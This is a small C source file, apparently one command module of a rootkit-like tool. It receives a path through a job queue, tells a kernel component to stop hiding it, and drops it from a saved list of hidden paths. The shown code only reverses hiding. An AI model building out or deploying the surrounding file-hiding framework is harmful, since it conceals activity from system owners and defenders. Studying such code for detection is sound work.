#include "../inc/cmds.h"
#include "../inc/kernel.h"
#include "../inc/save.h"

#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

bool unhide_path(char *path) {
  // make sure the path is absolute
  if (NULL == path)
    return false;

  if (!kernel_send(KERNEL_CMD_UNHIDE, path, strlen(path)))
    return false;

  return true;
}

char *cmd_unhide(job_t *job) {
  cmd_recv_all(job);
  char full_path[PATH_MAX + 1];

  if (NULL == realpath(job->data, full_path))
    return strerror(errno);

  if (!unhide_path(full_path))
    return "operation failed";

  if (!save_del("hidden", full_path))
    return "failed to unsave the path";

  return "success";
}
